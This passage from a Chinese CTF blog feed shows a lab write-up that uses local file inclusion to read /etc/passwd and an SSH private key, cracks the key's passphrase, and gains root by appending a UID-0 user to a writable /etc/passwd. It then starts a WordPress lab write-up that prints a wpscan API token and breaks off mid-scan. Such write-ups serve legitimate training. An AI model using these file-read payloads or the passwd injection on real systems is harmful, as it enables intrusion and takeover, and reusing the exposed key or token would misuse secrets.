10s<br>===============================================================<br>Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.html                (Status: 403) [Size: 277]<br>/index.html           (Status: 200) [Size: 39760]<br>/.php                 (Status: 403) [Size: 277]<br>/about.html           (Status: 200) [Size: 31341]<br>/contact.html         (Status: 200) [Size: 49539]<br>/blog.html            (Status: 200) [Size: 31455]<br>/img                  (Status: 301) [Size: 310] [--&gt; http://192.168.2.44/img/]<br>/main.html            (Status: 200) [Size: 931]<br>/css                  (Status: 301) [Size: 310] [--&gt; http://192.168.2.44/css/]<br>/js                   (Status: 301) [Size: 309] [--&gt; http://192.168.2.44/js/]<br>/elements.html        (Status: 200) [Size: 39421]<br>/fonts                (Status: 301) [Size: 312] [--&gt; http://192.168.2.44/fonts/]<br>/Department.html      (Status: 200) [Size: 35900]<br>/.php                 (Status: 403) [Size: 277]<br>/.html                (Status: 403) [Size: 277]<br>/server-status        (Status: 403) [Size: 277]<br>Progress: 1102800 / 1102805 (100.00%)<br>===============================================================<br>Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>使用<code>IP和域名</code>进行目录扫描，都没有找到有用的目录</p><h2 id="2、文件包含"><a href="#2、文件包含" class="headerlink" title="2、文件包含"></a>2、文件包含</h2><p>在访问时，发现<code>doctor</code>页面存在文件包含<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507031508808.png"></p><p>尝试读取<code>/etc/passwd</code>，发现可以读取，同时找到一个用户<code>admin</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/vulnyx/doctor]<br>└─# curl http://192.168.2.44/doctor-item.php?include=../../../../../etc/passwd                     <br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin<br>systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin<br>systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin<br>systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin<br>messagebus:x:104:110::/nonexistent:/usr/sbin/nologin<br>sshd:x:105:65534::/run/sshd:/usr/sbin/nologin<br>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin<br>admin:x:1000:1000:admin:/home/admin:/bin/bash<br></code></pre></td></tr></table></figure><p>读取<code>admin</code>的ssh私钥</p><ul><li>先读取<code>authorized_keys</code><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/vulnyx/doctor]<br>└─# curl http://192.168.2.44/doctor-item.php?include=../../../../../home/admin/.ssh/authorized_keys<br>ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAXfEfC22Bpq40UDZ8QXeuQa6EVJPmW6BjB4Ud/knShqQ86qCUatKaNlMfdpzKaagEBtlVUYwit68VH5xHV/QIcAzWi+FNw0SB2KTYvS514pkYj2mqrONdu1LQLvgXIqbmV7MPyE2AsGoQrOftpLKLJ8JToaIUCgYsVPHvs9Jy3fka+qLRHb0HjekPOuMiq19OeBeuGViaqILY+w9h19ebZelN8fJKW3mX4mkpM7eH4C46J0cmbK3ztkZuQ9e8Z14yAhcehde+sEHFKVcPS0WkHl61aTQoH/XTky8dHatCUucUATnwjDvUMgrVZ5cTjr4Q4YSvSRSIgpDP2lNNs1B7 mowree@EvilBoxOne<br></code></pre></td></tr></table></figure></li><li>再读取私钥文件<code>id_rsa</code><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/vulnyx/doctor]<br>└─# curl http://192.168.2.44/doctor-item.php?include=../../../../../home/admin/.ssh/id_rsa         <br>-----BEGIN RSA PRIVATE KEY-----<br>Proc-Type: 4,ENCRYPTED<br>DEK-Info: DES-EDE3-CBC,9FB14B3F3D04E90E<br><br>uuQm2CFIe/eZT5pNyQ6+K1Uap/FYWcsEklzONt+x4AO6FmjFmR8RUpwMHurmbRC6<br>hqyoiv8vgpQgQRPYMzJ3QgS9kUCGdgC5+cXlNCST/GKQOS4QMQMUTacjZZ8EJzoe<br>o7+7tCB8Zk/sW7b8c3m4Cz0CmE5mut8ZyuTnB0SAlGAQfZjqsldugHjZ1t17mldb<br>+gzWGBUmKTOLO/gcuAZC+Tj+BoGkb2gneiMA85oJX6y/dqq4Ir10Qom+0tOFsuot<br>b7A9XTubgElslUEm8fGW64kX3x3LtXRsoR12n+krZ6T+IOTzThMWExR1Wxp4Ub/k<br>HtXTzdvDQBbgBf4h08qyCOxGEaVZHKaV/ynGnOv0zhlZ+z163SjppVPK07H4bdLg<br>9SC1omYunvJgunMS0ATC8uAWzoQ5Iz5ka0h+NOofUrVtfJZ/OnhtMKW+M948EgnY<br>zh7Ffq1KlMjZHxnIS3bdcl4MFV0F3Hpx+iDukvyfeeWKuoeUuvzNfVKVPZKqyaJu<br>rRqnxYW/fzdJm+8XViMQccgQAaZ+Zb2rVW0gyifsEigxShdaT5PGdJFKKVLS+bD1<br>tHBy6UOhKCn3H8edtXwvZN+9PDGDzUcEpr9xYCLkmH+hcr06ypUtlu9UrePLh/Xs<br>94KATK4joOIW7O8GnPdKBiI+3Hk0qakL1kyYQVBtMjKTyEM8yRcssGZr/MdVnYWm<br>VD5pEdAybKBfBG/xVu2CR378BRKzlJkiyqRjXQLoFMVDz3I30RpjbpfYQs2Dm2M7<br>Mb26wNQW4ff7qe30K/Ixrm7MfkJPzueQlSi94IHXaPvl4vyCoPLW89JzsNDsvG8P<br>hrkWRpPIwpzKdtMPwQbkPu4ykqgKkYYRmVlfX8oeis3C1hCjqvp3Lth0QDI+7Shr<br>Fb5w0n0qfDT4o03U1Pun2iqdI4M+iDZUF4S0BD3xA/zp+d98NnGlRqMmJK+StmqR<br>IIk3DRRkvMxxCm12g2DotRUgT2+mgaZ3nq55eqzXRh0U1P5QfhO+V8WzbVzhP6+R<br>MtqgW1L0iAgB4CnTIud6DpXQtR9l//9alrXa+4nWcDW2GoKjljxOKNK8jXs58SnS<br>62LrvcNZVokZjql8Xi7xL0XbEk0gtpItLtX7xAHLFTVZt4UH6csOcwq5vvJAGh69<br>Q/ikz5XmyQ+wDwQEQDzNeOj9zBh1+1zrdmt0m7hI5WnIJakEM2vqCqluN5CEs4u8<br>p1ia+meL0JVlLobfnUgxi3Qzm9SF2pifQdePVU4GXGhIOBUf34bts0iEIDf+qx2C<br>pwxoAe1tMmInlZfR2sKVlIeHIBfHq/hPf2PHvU0cpz7MzfY36x9ufZc5MH2JDT8X<br>KREAJ3S0pMplP/ZcXjRLOlESQXeUQ2yvb61m+zphg0QjWH131gnaBIhVIj1nLnTa<br>i99+vYdwe8+8nJq4/WXhkN+VTYXndET2H0fFNTFAqbk2HGy6+6qS/4Q6DVVxTHdp<br>4Dg2QRnRTjp74dQ1NZ7juucvW7DBFE+CK80dkrr9yFyybVUqBwHrmmQVFGLkS2I/<br>8kOVjIjFKkGQ4rNRWKVoo/HaRoI/f2G6tbEiOVclUMT8iutAg8S4VA==<br>-----END RSA PRIVATE KEY-----<br></code></pre></td></tr></table></figure></li></ul><h1 id="四、SSH私钥密码破解"><a href="#四、SSH私钥密码破解" class="headerlink" title="四、SSH私钥密码破解"></a>四、SSH私钥密码破解</h1><p>发现私钥是经过加密的，需要进行破解</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/vulnyx/doctor]<br>└─# ssh2john id_rsa &gt; tmp           <br><br>┌──(root㉿kali)-[/miao/vulnyx/doctor]<br>└─# john tmp --wordlist=/usr/share/wordlists/rockyou.txt    <br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])<br>Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 <span class="hljs-keyword">for</span> all loaded hashes<br>Cost 2 (iteration count) is 2 <span class="hljs-keyword">for</span> all loaded hashes<br>Will run 8 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>unicorn          (id_rsa)     <br>1g 0:00:00:00 DONE (2025-07-03 15:34) 14.28g/s 18285p/s 18285c/s 18285C/s ramona..poohbear1<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session completed. <br></code></pre></td></tr></table></figure><p>找到私钥的密码<code>unicorn</code></p><h1 id="五、获取USER权限"><a href="#五、获取USER权限" class="headerlink" title="五、获取USER权限"></a>五、获取USER权限</h1><p>直接使用私钥进行连接</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/miao/vulnyx/doctor]<br>└─# ssh admin@192.168.2.44 -i id_rsa<br>Enter passphrase <span class="hljs-keyword">for</span> key <span class="hljs-string">&#x27;id_rsa&#x27;</span>: <br>admin@doctor:~$ <span class="hljs-built_in">id</span><br>uid=1000(admin) gid=1000(admin) grupos=1000(admin)<br></code></pre></td></tr></table></figure><p><strong>USER FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">admin@doctor:~$ <span class="hljs-built_in">cat</span> user.txt<br><br></code></pre></td></tr></table></figure><h1 id="六、权限提升"><a href="#六、权限提升" class="headerlink" title="六、权限提升"></a>六、权限提升</h1><p>使用<code>sudo -l</code>，提示无法使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">admin@doctor:~$ <span class="hljs-built_in">sudo</span> -l<br>-bash: <span class="hljs-built_in">sudo</span>: orden no encontrada<br></code></pre></td></tr></table></figure><h2 id="passwd写权限"><a href="#passwd写权限" class="headerlink" title="passwd写权限"></a>passwd写权限</h2><p>查看文件权限，发现<code>/etc/passwd</code>具有<code>w</code>权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">admin@doctor:/$ <span class="hljs-built_in">ls</span> -la /etc/passwd<br>-rw----rw- 1 root root 1454 jul  3 09:46 /etc/passwd<br></code></pre></td></tr></table></figure><p>写入一个具有<code>root</code>权限的用户</p><ul><li><p>使用<code>openssl</code>生成密码<code>123456</code>的哈希值</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">admin@doctor:/$ openssl passwd<br>Password: <br>Verifying - Password: <br>cxHZ02OJlqOKA<br></code></pre></td></tr></table></figure></li><li><p>写入<code>/etc/passwd</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">admin@doctor:/$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;miao:cxHZ02OJlqOKA:0:0:root:/root:/bin/bash&quot;</span> &gt;&gt; /etc/passwd<br></code></pre></td></tr></table></figure></li></ul><p>切换用户，发现具有<code>root</code>权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">admin@doctor:/$ su miao<br>Contraseña: <br>root@doctor:/# <span class="hljs-built_in">id</span><br>uid=0(root) gid=0(root) grupos=0(root)<br></code></pre></td></tr></table></figure><p><strong>ROOT FLAG</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">root@doctor:~# <span class="hljs-built_in">cat</span> root.txt<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Vulnyx</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件包含</tag>
      
      <tag>提权-passwd</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>New</title>
    <link href="/Maze-sec/New/"/>
    <url>/Maze-sec/New/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p>QQ群：<code>660930334</code></p><h1 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# nmap -sn 192.168.2.0/24             <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-02 15:31 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.1<br>Host is up (0.00029s latency).<br>MAC Address: 0A:00:27:00:00:0A (Unknown)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.2<br>Host is up (0.00015s latency).<br>MAC Address: 08:00:27:B2:2E:24 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.43<br>Host is up (0.00033s latency).<br>MAC Address: 08:00:27:AF:2D:61 (Oracle VirtualBox virtual NIC)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.4<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (4 hosts up) scanned <span class="hljs-keyword">in</span> 2.16 seconds<br></code></pre></td></tr></table></figure><p>靶机IP地址：<code>192.168.2.43</code></p><h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><h2 id="1、全端口扫描"><a href="#1、全端口扫描" class="headerlink" title="1、全端口扫描"></a>1、全端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# nmap --min-rate 10000 -p- 192.168.2.43                   <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-02 15:31 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.43<br>Host is up (0.00039s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 08:00:27:AF:2D:61 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 3.75 seconds<br></code></pre></td></tr></table></figure><p>开放端口：<code>22和80</code></p><h2 id="2、详细信息扫描"><a href="#2、详细信息扫描" class="headerlink" title="2、详细信息扫描"></a>2、详细信息扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# nmap --min-rate 10000 -sT -sV -sC -O -p22,80 192.168.2.43<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-02 15:32 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.43<br>Host is up (0.0068s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)<br>| ssh-hostkey: <br>|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)<br>|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)<br>|_  256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)<br>80/tcp open  http    Apache httpd 2.4.62 ((Debian))<br>| http-robots.txt: 1 disallowed entry <br>|_/wp-admin/<br>|_http-server-header: Apache/2.4.62 (Debian)<br>|_http-generator: WordPress 6.8.1<br>|_http-title: Hi Maze<br>MAC Address: 08:00:27:AF:2D:61 (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 12.79 seconds<br></code></pre></td></tr></table></figure><p>发现网站下面存在两个目录<code>robots.txt</code>和<code>wp-admin</code></p><h2 id="3、UDP端口扫描"><a href="#3、UDP端口扫描" class="headerlink" title="3、UDP端口扫描"></a>3、UDP端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# nmap -sU --top-ports 100 192.168.2.43<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-02 16:14 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.2.43<br>Host is up (0.00098s latency).<br>Not shown: 99 closed udp ports (port-unreach)<br>PORT   STATE         SERVICE<br>68/udp open|filtered dhcpc<br>MAC Address: 08:00:27:AF:2D:61 (Oracle VirtualBox virtual NIC)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 108.43 seconds<br></code></pre></td></tr></table></figure><p>无开放的端口</p><h1 id="WEB渗透"><a href="#WEB渗透" class="headerlink" title="WEB渗透"></a>WEB渗透</h1><p>访问80端口<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507021622727.png"><br>发现是使用<code>WordPress</code>搭建的网站</p><p>同时在端口详细信息扫描时发现了两个目录<code>robots.txt</code>和<code>wp-admin</code>，依次访问查看</p><ul><li><p><code>robots.txt</code>：存在两个目录<code>/wp-admin</code>和<code>/wp-admin/admin-ajax.php</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# curl http://192.168.2.43/robots.txt             <br>User-agent: *<br>Disallow: /wp-admin/<br>Allow: /wp-admin/admin-ajax.php<br></code></pre></td></tr></table></figure></li><li><p><code>wp-admin</code>：被重定向到了一个域名<code>new.dsz</code><br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507021636705.png"></p></li><li><p>访问<code>robots.txt</code>里面的路径<code>/wp-admin/admin-ajax.php</code>，显示<code>0</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# curl  http://192.168.2.43/wp-admin/admin-ajax.php <br>0 <br></code></pre></td></tr></table></figure></li></ul><p>追加域名<code>new.dsz</code>到<code>hosts</code>文件中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;192.168.2.43 new.dsz&quot;</span> &gt;&gt; /etc/hosts<br></code></pre></td></tr></table></figure><p>再次访问<code>wp-admin</code>：进入到<code>WordPress</code>的管理界面<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202507021702185.png"></p><h2 id="1、wpscan扫描"><a href="#1、wpscan扫描" class="headerlink" title="1、wpscan扫描"></a>1、wpscan扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[/tmp]<br>└─# wpscan --url http://new.dsz/ --api-token Jrh7ozpao7LtkyqVZwMeXCKeqJN0zHplyeG8SaQU124 -e u,vp<br>_______________________________________________________________<br>         __          _______   _____<br>         \ \        / /  __ \ / ____|<br>          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®<br>           \ \/  \/ / |  ___/ \___ \ / __|/ _` | _ \<br>            \  /\  /  | |     ____) | (__| (_| | | | |<br>             \/  \/   |_|    |_____/ \___|\__,_|_| |_|<br><br>         WordPress Security Scanner by the WPScan Team<br>                         Version 3.8.27<br>       Sponsored by Automattic - https://automattic.com/<br>       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart<br>_______________________________________________________________<br><br>[+] URL: http://new.dsz/ 